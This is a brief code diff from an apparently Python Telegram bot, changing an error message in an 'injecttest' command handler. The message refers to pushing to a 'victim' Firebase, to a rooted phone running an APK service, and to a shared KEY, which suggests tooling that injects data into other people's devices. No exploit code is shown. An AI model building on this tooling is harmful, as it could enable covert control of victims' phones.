@@ -1066,7 +1066,7 @@ async def injecttest_command(update: Update, context: ContextTypes.DEFAULT_TYPE)
         schedule_auto_stop(user.id, _auto_stop_minutes(profile))
     else:
         await update.message.reply_text(
-            "❌ Inject victim Firebase pe push fail — /mynum, KEY, device DB check karo\n"
+            "❌ Inject queue push failed — check /mynum, KEY, device Firebase URL\n"
             "APK phone: START SERVICE ON + same KEY + rooted",
             parse_mode="HTML",
         )
